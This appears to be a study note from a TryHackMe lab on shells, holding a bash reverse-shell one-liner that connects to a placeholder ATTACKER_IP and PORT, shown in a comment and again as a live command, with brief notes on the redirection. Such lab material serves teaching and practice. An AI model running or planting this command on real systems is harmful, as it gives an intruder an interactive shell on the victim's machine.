# Normal Bash Reverse Shell
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#
#   bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
#
# The >& operator combines stdout and stderr.
# Initiates an interactive bash shell over TCP.

bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
